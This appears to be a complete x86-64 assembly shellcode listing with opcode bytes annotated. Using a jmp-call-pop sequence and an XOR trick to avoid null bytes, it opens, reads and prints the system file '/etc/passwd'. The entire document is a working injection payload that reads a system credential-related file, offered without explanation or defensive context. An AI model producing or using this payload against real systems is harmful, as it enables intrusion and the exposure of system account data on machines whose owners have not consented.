BITS 64
section .text
global _start

_start:
    jmp end         ; eb 3f 
start:
    pop rdi ; 5f 
    xor byte[rdi + 0xb], 0x41 ; 80 77 0b 41 
    xor rax, rax ; 48 31 c0 
    add al, 2 ; 04 02 
    xor rsi, rsi ; 48 31 f6 
    syscall  ; 0f 05 
    sub sp, 0xfff ; 66 81 ec ff 0f 
    lea rsi, [rsp] ; 48 8d 34 24 
    mov rdi, rax ; 48 89 c7 
    xor rdx, rdx ; 48 31 d2 
    mov dx, 0xfff ; 66 ba ff 0f 
    xor rax, rax ; 48 31 c0 
    syscall  ; 0f 05 
    xor rdi, rdi ; 48 31 ff 
    add dil, 1 ; 40 80 c7 01 
    mov rdx, rax ; 48 89 c2 
    xor rax, rax ; 48 31 c0 
    add al, 1 ; 04 01 
    syscall  ; 0f 05 
    xor rax, rax ; 48 31 c0 
    add al, 0x3c ; 04 3c 
    syscall  ; 0f 05 
end:
    call start      ; e8 bc ff ff ff 
    db 0x2f, 0x65, 0x74, 0x63, 0x2f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x41
